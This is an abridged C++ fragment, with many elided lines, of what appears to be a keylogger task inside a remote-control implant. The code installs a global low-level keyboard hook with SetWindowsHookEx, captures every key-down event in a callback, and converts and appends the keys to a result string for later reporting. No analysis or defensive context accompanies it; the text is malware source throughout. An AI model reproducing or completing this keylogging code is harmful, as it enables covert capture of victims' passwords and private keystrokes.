...
namespace Task::Helper::KeyLog
{
    VOID SaveKey(DWORD dwKey)
    {
        ...
        else
        {
            ...
            result += Utils::Convert::UTF8Decode(sKey);
        }
    }
    ...
    LRESULT CALLBACK KeyboardProc(
        ...
        if (nCode >= 0)
        {
            if (wParam == WM_KEYDOWN)
            {
                ...
                Task::Helper::KeyLog::SaveKey(kbdStruct.vkCode);
            }
        }
...
namespace Task
{
    std::wstring KeyLog(State::PSTATE pState, const std::wstring& wLogTime)
    {
        ...
        hHook = SetWindowsHookEx(WH_KEYBOARD_LL, Task::Helper::KeyLog::KeyboardProc, NULL, 0);
        if (!hHook)
        {
